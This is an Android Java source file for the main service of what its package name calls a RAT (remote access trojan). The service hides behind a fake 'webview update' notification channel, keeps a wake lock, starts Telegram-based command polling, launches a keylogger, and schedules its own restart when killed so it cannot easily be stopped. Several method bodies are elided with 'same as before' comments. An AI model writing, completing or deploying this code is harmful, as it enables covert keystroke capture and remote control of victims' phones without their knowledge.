package com.enterprise.rat.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.enterprise.rat.R;
import com.enterprise.rat.receivers.AlarmReceiver;

public class MainService extends Service {
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "sys_webview_update";
    private TelegramPolling telegramPolling;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("MainService", "onCreate");
        createNotificationChannel();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, buildNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, buildNotification());
        }
        acquireWakeLock();
        startTelegramPolling();
        startKeylogger();
        scheduleAlarm();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("MainService", "onStartCommand");
        if (telegramPolling == null || !telegramPolling.isRunning()) {
            startTelegramPolling();
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void createNotificationChannel() { /* ... sama seperti sebelumnya ... */ }
    private Notification buildNotification() { /* ... sama seperti sebelumnya ... */ }
    private void acquireWakeLock() { /* ... sama seperti sebelumnya ... */ }

    private void startTelegramPolling() {
        if (telegramPolling != null) telegramPolling.stop();
        telegramPolling = new TelegramPolling(this);
        new Thread(telegramPolling).start();
        Log.d("MainService", "Polling started");
    }

    private void startKeylogger() { /* ... sama seperti sebelumnya ... */ }
    private void scheduleAlarm() { /* ... sama seperti sebelumnya ... */ }

    @Override
    public void onDestroy() {
        Log.d("MainService", "onDestroy");
        if (telegramPolling != null) telegramPolling.stop();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();

        Intent restartIntent = new Intent(this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 0, restartIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (alarmManager != null) {
            try {
                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent);
            } catch (SecurityException e) {
                Log.w("MainService", "Cannot set restart alarm");
            }
        }
        super.onDestroy();
    }
}
